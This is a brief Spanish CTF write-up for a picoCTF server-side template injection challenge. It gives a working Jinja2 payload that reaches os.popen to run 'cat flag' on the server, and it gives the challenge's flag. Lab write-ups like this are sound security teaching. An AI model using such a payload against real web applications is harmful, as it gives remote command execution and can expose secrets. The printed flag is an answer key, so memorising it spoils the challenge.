## Descripción

I made a cool website where you can announce whatever you want! Try it out!I heard templating is a cool and modular way to build web apps! Check out my website [here](http://rescued-float.picoctf.net:65093/)!

## Pistas

1. Server Side Template Injection

## Solución

`Ingresamos a la página y copiamos el siguiente código`
`{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag').read() }}`

`picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_3066c7bd}`

## Notas Adicionales



## Referencias
- 

